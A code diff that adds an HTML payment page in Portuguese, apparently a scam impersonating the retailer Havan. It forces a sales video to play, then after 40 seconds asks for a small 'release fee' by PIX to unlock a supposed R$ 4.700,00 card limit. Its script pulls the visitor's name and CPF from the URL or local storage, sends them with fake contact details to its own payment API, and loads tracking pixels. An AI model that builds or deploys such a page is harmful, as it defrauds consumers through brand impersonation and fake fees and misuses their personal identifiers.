@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Concluir Liberação - Havan</title>
+    <link rel="shortcut icon" href="https://www.havan.com.br/favicon.ico" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Pixel e UTM -->
+    <script>
+        window.pixelId = "67c65ea78480a2789186da08";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap');
+        body { font-family: 'Montserrat', sans-serif; background-color: #f4f4f4; }
+        .havan-blue { color: #003399; }
+        .bg-havan-blue { background-color: #003399; }
+        .havan-yellow { background-color: #ffcc00; }
+        .havan-card { border-radius: 12px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); overflow: hidden; }
+        .notification-popup { position: fixed; top: 20px; right: -300px; background-color: #28a745; color: white; padding: 16px; border-radius: 8px; z-index: 1000; transition: right 0.3s ease-in-out; display: flex; align-items: center; gap: 8px; }
+        .notification-popup.show { right: 20px; }
+    </style>
+</head>
+<body class="min-h-screen pb-10">
+    <div id="notification" class="notification-popup">
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <header class="bg-white flex px-6 h-20 items-center justify-center border-b-4 border-havan-yellow">
+        <!-- Logo Colorida para o Back Redirect -->
+        <img src="data:image/png;base64,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" alt="Havan" style="height: 50px; width: auto;">
+    </header>
+
+    <main class="max-w-lg mx-auto mt-8 px-4">
+        <!-- VSL Section -->
+        <div class="bg-white havan-card p-4 mb-6">
+            <h2 class="text-center font-bold havan-blue mb-4">ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU ACESSO</h2>
+            <div class="rounded-lg overflow-hidden shadow-inner bg-black">
+                <video id="nativeVsl" autoplay muted playsinline preload="auto"
+                       poster="https://cdn.converteai.net/a0115334-6dcd-43e4-8bd0-be2c842a6cbf/69ea1d19af7645fdd1e4fc8c/poster.jpg"
+                       style="display:block;width:100%;background:#000;pointer-events:none;"></video>
+                <div style="height:3px;width:100%;background:rgba(0,0,0,.15);overflow:hidden;">
+                    <div id="vslProgress" style="height:100%;width:0;background:#003399;transition:width .2s linear;"></div>
+                </div>
+                <div id="vslArrow" style="display:none;text-align:center;margin-top:14px;animation:arrowBounce 1.2s infinite;">
+                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 4v14m0 0l-6-6m6 6l6-6" stroke="#003399" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <style>@keyframes arrowBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(8px)} }</style>
+                <script src="https://cdn.jsdelivr.net/npm/hls.js@1.5.13/dist/hls.min.js"></script>
+                <script>
+                    (function(){
+                        var v = document.getElementById('nativeVsl');
+                        var fill = document.getElementById('vslProgress');
+                        var arrow = document.getElementById('vslArrow');
+                        var ended = false;
+                        var src = 'https://cdn.converteai.net/a0115334-6dcd-43e4-8bd0-be2c842a6cbf/69ea1d19af7645fdd1e4fc8c/main.m3u8';
+                        if (v.canPlayType('application/vnd.apple.mpegurl')) { v.src = src; }
+                        else if (window.Hls && window.Hls.isSupported()) { var hls = new Hls(); hls.loadSource(src); hls.attachMedia(v); }
+                        else { v.src = src; }
+                        v.loop = false;
+                        v.volume = 1;
+                        var tryPlay = function(){ if (ended) return; var p = v.play(); if (p && p.catch) p.catch(function(){}); };
+                        tryPlay();
+                        v.addEventListener('pause', function(){ if (!ended) setTimeout(tryPlay, 0); });
+                        v.addEventListener('ended', function(){ ended = true; arrow.style.display = 'block'; });
+                        v.addEventListener('timeupdate', function(){ if (v.duration) fill.style.width = (v.currentTime / v.duration * 100) + '%'; });
+                        var unmute = function(){
+                            v.muted = false; v.volume = 1; tryPlay();
+                            ['pointerdown','touchstart','keydown','click'].forEach(function(e){ document.removeEventListener(e, unmute, true); });
+                        };
+                        ['pointerdown','touchstart','keydown','click'].forEach(function(e){ document.addEventListener(e, unmute, true); });
+                    })();
+                </script>
+            </div>
+        </div>
+
+        <!-- Checkout Section (Hidden for 40s) -->
+        <div id="checkout-section" class="hidden bg-white havan-card">
+            <div class="px-6 py-4 bg-gray-50 border-b border-gray-200 flex items-center justify-between">
+                <div>
+                    <h2 class="text-xl font-bold havan-blue">Concluir Liberação</h2>
+                    <p class="text-xs font-semibold text-gray-600 mt-1">Oferta Especial: 35% OFF</p>
+                </div>
+                <div class="bg-havan-yellow text-havan-blue text-xs font-bold px-3 py-1 rounded-full">AGUARDANDO</div>
+            </div>
+
+            <div class="px-6 py-6 border-b border-gray-100">
+                <div class="bg-blue-50 rounded-xl p-4 border border-blue-100">
+                    <div class="flex justify-between py-2 border-b border-dashed border-blue-200">
+                        <span class="text-xs font-semibold text-gray-500 uppercase">Valor Original:</span>
+                        <span class="text-sm font-bold text-gray-400 line-through">R$ 28,82</span>
+                    </div>
+                    <div class="flex justify-between py-2 border-b border-dashed border-blue-200">
+                        <span class="text-xs font-semibold text-gray-500 uppercase">Limite do cartão:</span>
+                        <span class="text-sm font-bold text-havan-blue">R$ 4.700,00</span>
+                    </div>
+                    <div class="flex justify-between py-2">
+                        <span class="text-xs font-semibold text-gray-500 uppercase">Valor com Desconto:</span>
+                        <span class="text-sm font-bold text-havan-blue">R$ 18,73</span>
+                    </div>
+                </div>
+
+                <div class="text-center mt-6">
+                    <p class="text-gray-500 text-xs font-medium uppercase tracking-wider">Valor Final da Taxa</p>
+                    <div class="text-3xl font-black havan-blue mt-1">R$ 18,73</div>
+                </div>
+
+                <div class="mt-6">
+                    <div id="imagemContainer" class="bg-white p-4 rounded-xl border-2 border-dashed border-gray-200 cursor-pointer flex flex-col items-center justify-center" style="min-height: 280px;" onclick="copiarPixCode()">
+                        <div id="loading-placeholder" class="text-center text-gray-400">
+                            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-havan-blue mx-auto mb-4"></div>
+                            <p class="font-medium">Gerando seu QR Code...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-6">
+                    <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Código PIX Copia e Cola</label>
+                    <input id="codigo-input" type="text" readonly value="Carregando..." class="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 text-sm font-mono text-gray-600 focus:outline-none">
+                </div>
+                
+                <button onclick="copiarPixCode()" class="w-full bg-havan-blue text-white font-bold py-4 rounded-xl mt-4 uppercase shadow-lg">
+                    COPIAR CÓDIGO PIX
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const API_URL = '/api/pix/create';
+        const STATUS_URL = '/api/pix/status';
+        const REDIRECT_URL = '/funil/pos/obrigado/';
+        const AMOUNT = 1873; // R$ 18,73 (35% OFF de 28,82)
+        let pixCode = null;
+        let transactionId = null;
+
+        function cleanString(str) { return str ? str.replace(/\{\{|\}\}/g, '').trim() : ""; }
+        function cleanCPF(cpf) { return cpf ? cpf.replace(/\D/g, '') : ""; }
+
+        async function generatePix() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const dadosUsuarioLS = JSON.parse(localStorage.getItem('dadosCPF')) || {};
+                let nomeFinal = cleanString(urlParams.get('nome') || dadosUsuarioLS.nomeCompleto || "Cliente Havan");
+                let cpfFinal = cleanCPF(urlParams.get('cpf') || dadosUsuarioLS.cpf || "57948135715");
+
+                const payload = {
+                    "amount": AMOUNT,
+                    "description": "Havan - Taxa de Liberação Especial",
+                    "customer": { "name": nomeFinal, "document": cpfFinal, "email": "cliente@havan.com.br", "phone": "11999999999" },
+                    "item": { "title": "Taxa de Liberação Especial 35% OFF", "price": AMOUNT, "quantity": 1 },
+                    "paymentMethod": "PIX",
+                    "utm": window.location.search.substring(1)
+                };
+
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                if (result.pixCode) {
+                    pixCode = result.pixCode;
+                    transactionId = result.transactionId;
+                    document.getElementById('codigo-input').value = pixCode;
+                    renderQRCode(pixCode);
+                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("checkout", { value: AMOUNT / 100 }); }
+                    setInterval(checkStatus, 5000);
+                }
+            } catch (error) { console.error(error); }
+        }
+
+        async function checkStatus() {
+            if (!transactionId) return;
+            try {
+                const response = await fetch(`${STATUS_URL}?transactionId=${transactionId}`);
+                const result = await response.json();
+                if (result.status === 'COMPLETED') {
+                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("purchase", { value: AMOUNT / 100 }); }
+                    window.location.replace(REDIRECT_URL + window.location.search);
+                }
+            } catch (e) {}
+        }
+
+        function renderQRCode(text) {
+            const container = document.getElementById('imagemContainer');
+            container.innerHTML = '';
+            new QRCode(container, { text: text, width: 240, height: 240, colorDark: "#003399", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.L });
+        }
+
+        function copiarPixCode() {
+            navigator.clipboard.writeText(pixCode).then(() => {
+                const popup = document.getElementById('notification');
+                popup.classList.add('show');
+                setTimeout(() => popup.classList.remove('show'), 3000);
+            });
+        }
+
+        // Delay de 40 segundos para mostrar o checkout
+        setTimeout(() => {
+            document.getElementById('checkout-section').classList.remove('hidden');
+            generatePix();
+        }, 40000);
+    </script>
+</body>
+</html>
